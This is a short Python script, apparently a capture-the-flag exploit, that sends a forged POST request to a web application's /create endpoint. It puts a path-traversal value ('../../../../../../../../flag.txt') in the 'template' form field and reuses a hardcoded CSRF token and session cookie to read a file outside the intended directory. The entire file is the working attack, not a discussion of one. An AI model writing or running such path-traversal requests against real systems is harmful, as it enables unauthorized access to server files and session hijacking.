import requests

content = """
    lovely day, isn't it?
"""

data = {
    "csrfmiddlewaretoken": "FJlFtyrdrbIehmBP8HQeIvukIzr1qW7UIx4ChlylWfjCE2u9gJcA1fqVOM9qTct5",
    "recipient": "wulux",
    "content": content,
    "template": "../../../../../../../../flag.txt",
}


headers = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Content-Type": "application/x-www-form-urlencoded",
    "Cookie": "csrftoken=dYT7YXhiFeLyxQ3uicwwtU6LgnSzDqwl; sessionid=h3v9w8g5tldawahyo2zj9ku7y6kpxsvt",
    "Origin": "https://web.kazet.cc:42448",
    "Referer": "https://web.kazet.cc:42448/create",
}

url = "https://web.kazet.cc:42448/create"

requests.post(url, data=data, headers=headers)
print("Sent!")
